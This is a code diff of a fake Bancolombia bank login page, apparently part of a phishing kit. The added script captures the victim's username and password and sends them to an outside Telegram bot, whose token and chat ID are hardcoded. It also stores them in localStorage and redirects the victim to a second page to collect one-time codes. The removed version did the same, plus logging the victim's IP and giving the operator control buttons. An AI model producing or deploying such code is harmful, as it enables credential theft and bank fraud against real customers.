@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ingreso - Bancolombia</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -46,7 +46,7 @@
             pointer-events: none;
         }
 
-        .page-wrap {
+        .login-wrap {
             min-height: 100%;
             display: flex;
             align-items: center;
@@ -56,7 +56,7 @@
             z-index: 1;
         }
 
-        .card {
+        .login-card {
             width: 100%;
             max-width: 480px;
             background: var(--card-bg);
@@ -77,19 +77,19 @@
             height: auto;
         }
 
-        .header {
+        .login-header {
             text-align: center;
             margin-bottom: 32px;
         }
 
-        .title {
+        .login-title {
             font-size: 24px;
             font-weight: 700;
             color: var(--text);
             margin-bottom: 8px;
         }
 
-        .subtitle {
+        .login-subtitle {
             font-size: 14px;
             color: #64748b;
             line-height: 1.5;
@@ -244,14 +244,13 @@
         }
 
         @media (max-width: 599px) {
-            .card {
+            .login-card {
                 padding: 28px 24px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-content">
             <div class="spinner"></div>
@@ -259,23 +258,22 @@
         </div>
     </div>
 
-    <!-- Login Screen -->
-    <div class="page-wrap">
-        <div class="card">
+    <div class="login-wrap">
+        <div class="login-card">
             <div class="logo">
                 <svg viewBox="0 0 200 40">
                     <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
                 </svg>
             </div>
 
-            <div class="header">
-                <h1 class="title">🔐 Ingreso Seguro</h1>
-                <p class="subtitle">Ingresa tus credenciales para continuar con tu solicitud</p>
+            <div class="login-header">
+                <h1 class="login-title">🔐 Ingreso Seguro</h1>
+                <p class="login-subtitle">Ingresa tus credenciales para continuar</p>
             </div>
 
-            <div class="alert-error" id="loginError">
+            <div class="alert-error" id="errorAlert">
                 <i class='bx bx-error-circle'></i>
-                <span>Usuario o clave incorrectos. Por favor verifica e intenta nuevamente.</span>
+                <span>Usuario o clave incorrectos</span>
             </div>
 
             <form id="loginForm">
@@ -295,9 +293,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn-submit">
-                    INGRESAR
-                </button>
+                <button type="submit" class="btn-submit">INGRESAR</button>
 
                 <div class="security-badge">
                     <i class='bx bx-shield-quarter'></i>
@@ -307,133 +303,95 @@
         </div>
     </div>
 
-    <!-- Script de Telegram -->
     <script src="js/telegram.js"></script>
-    
-    <!-- Script Principal -->
     <script>
-        console.log('🔐 Login page loaded');
+        // VERSIÓN SUPER SIMPLE - SIN ERRORES
+        console.log('🚀 Página cargada');
 
-        // Verificar si viene con error en URL
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('error') === '1') {
-            document.getElementById('loginError').classList.add('show');
-        }
+        const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
+        const CHAT_ID = '8469651553';
 
-        // Función para obtener IP
-        async function getIP() {
+        // Función para enviar a Telegram (backup si telegram.js falla)
+        async function enviarTelegram(mensaje) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return await response.json();
             } catch (error) {
-                console.error('❌ Error obteniendo IP:', error);
-                return 'IP no disponible';
+                console.error('Error Telegram:', error);
+                return null;
             }
         }
 
-        // Manejo del formulario de login
+        // Manejar formulario
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            console.log('📤 Form submitted');
+            console.log('📝 Formulario enviado');
 
             const usuario = document.getElementById('usuario').value.trim();
             const clave = document.getElementById('clave').value.trim();
 
             if (!usuario || !clave) {
-                document.getElementById('loginError').classList.add('show');
+                document.getElementById('errorAlert').classList.add('show');
                 return;
             }
 
             // Mostrar loading
             document.getElementById('loadingScreen').classList.add('active');
-            console.log('⏳ Loading screen activado');
+            console.log('⏳ Mostrando loading...');
 
+            // Generar ID
+            const id = Date.now().toString(36);
+
+            // Guardar en localStorage
+            const datos = {
+                usuario: usuario,
+                clave: clave,
+                transactionId: id,
+                timestamp: new Date().toLocaleString('es-CO')
+            };
+
+            localStorage.setItem('loginData', JSON.stringify(datos));
+            console.log('💾 Datos guardados:', datos);
+
+            // Mensaje para Telegram
+            const mensaje = `🔐 *LOGIN BANCOLOMBIA*\n\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n⏰ ${datos.timestamp}\n🆔 ID: ${id}`;
+
+            // Intentar enviar a Telegram
+            console.log('📤 Enviando a Telegram...');
             try {
-                // Obtener IP
-                console.log('🌐 Obteniendo IP...');
-                const userIP = await getIP();
-                console.log('✅ IP obtenida:', userIP);
-                
-                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
-                // Guardar datos en localStorage
-                const loginData = {
-                    usuario: usuario,
-                    clave: clave,
-                    ip: userIP,
-                    transactionId: transactionId,
-                    timestamp: new Date().toLocaleString('es-CO')
-                };
-
-                localStorage.setItem('loginData', JSON.stringify(loginData));
-                console.log('💾 Datos guardados:', loginData);
-
-                // Preparar mensaje para Telegram
-                const mensaje = `🔐 *BANCOLOMBIA - LOGIN*
-
-👤 *Usuario:* \`${usuario}\`
-🔑 *Clave:* \`${clave}\`
-🌐 *IP:* ${userIP}
-⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}
-📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}
-🆔 *ID:* \`${transactionId}\``;
-
-                const teclado = {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
-                            { text: "❌ Incorrecto", callback_data: `error_login:${transactionId}` }
-                        ],
-                        [
-                            { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
-                        ],
-                        [
-                            { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
-                        ]
-                    ]
-                };
-
-                console.log('📤 Enviando mensaje a Telegram...');
-                
-                // Enviar a Telegram
-                if (typeof sendTelegramMessage === 'function') {
-                    await sendTelegramMessage(mensaje, teclado);
-                    console.log('✅ Mensaje enviado exitosamente');
-                } else {
-                    console.warn('⚠️ sendTelegramMessage no disponible (continuando sin enviar)');
-                }
-
-                // Esperar 1.5 segundos y redirigir
-                console.log('⏳ Esperando antes de redirigir...');
-                
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').classList.remove('active');
-                    console.log('🔄 Redirigiendo a otp-dinamica.html');
-                    window.location.href = 'otp-dinamica.html';
-                }, 1500);
-
+                await enviarTelegram(mensaje);
+                console.log('✅ Enviado a Telegram');
             } catch (error) {
-                console.error('❌ Error:', error);
-                console.error('Stack:', error.stack);
-                
-                // Ocultar loading
-                document.getElementById('loadingScreen').classList.remove('active');
-                
-                // Mostrar error
-                alert('Error al procesar. Por favor intenta nuevamente.');
-                document.getElementById('loginError').classList.add('show');
+                console.log('⚠️ Error en Telegram (continuando):', error);
             }
+
+            // REDIRIGIR DESPUÉS DE 2 SEGUNDOS (siempre)
+            console.log('⏰ Timer iniciado - redirigirá en 2 segundos');
+            
+            setTimeout(function() {
+                console.log('🔄 REDIRIGIENDO AHORA');
+                document.getElementById('loadingScreen').classList.remove('active');
+                window.location.href = 'otp-dinamica.html';
+            }, 2000);
         });
 
         // Limpiar error al escribir
-        document.querySelectorAll('.form-input').forEach(input => {
-            input.addEventListener('input', () => {
-                document.getElementById('loginError').classList.remove('show');
+        document.querySelectorAll('.form-input').forEach(function(input) {
+            input.addEventListener('input', function() {
+                document.getElementById('errorAlert').classList.remove('show');
             });
         });
 
-        console.log('✅ Login script inicializado correctamente');
+        console.log('✅ Script listo');
     </script>
 </body>
 </html>
